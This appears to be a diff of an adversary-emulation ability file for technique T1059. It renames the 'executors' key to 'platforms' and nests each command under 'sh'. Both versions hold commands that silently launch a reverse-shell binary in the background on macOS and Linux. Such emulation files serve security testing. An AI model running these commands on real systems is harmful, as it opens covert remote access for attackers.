@@ -7,12 +7,14 @@
   technique:
     attack_id: T1059
     name: Command-Line Interface
-  executors:
+  platforms:
     darwin:
-      command: |
-        nohup ./reverse.go-darwin >/dev/null 2>&1 &
-      payload: reverse.go-darwin
+      sh:
+        command: |
+          nohup ./reverse.go-darwin >/dev/null 2>&1 &
+        payload: reverse.go-darwin
     linux:
-      command: |
-        nohup ./reverse.go-linux >/dev/null 2>&1 &
-      payload: reverse.go-linux
+      sh:
+        command: |
+          nohup ./reverse.go-linux >/dev/null 2>&1 &
+        payload: reverse.go-linux
